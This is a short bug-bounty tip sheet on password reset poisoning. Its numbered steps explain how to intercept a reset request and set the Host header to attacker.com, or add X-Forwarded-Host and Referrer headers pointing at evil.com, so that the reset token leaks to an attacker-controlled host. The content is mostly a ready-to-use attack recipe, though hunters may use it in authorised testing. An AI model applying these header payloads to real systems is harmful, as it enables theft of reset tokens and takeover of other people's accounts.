# PASSWORD RESET POISIONING LEADS TO TOKEN THEFT
```
1.Go to password reset funtion.
2.Enter email and intercept the request.
3.Change host header to some other host i.e,
    Host:target.com
    Host:attacker.com
  also try to add some headers without changing host like
    X-Forwarded-Host: evil.com
    Referrer: https://evil.com
4.Forward this if you found that in next request attacker.com means you successfully theft the token.:)
```

### Author
* [@Virdoex_hunter](https://twitter.com/Virdoex_hunter)
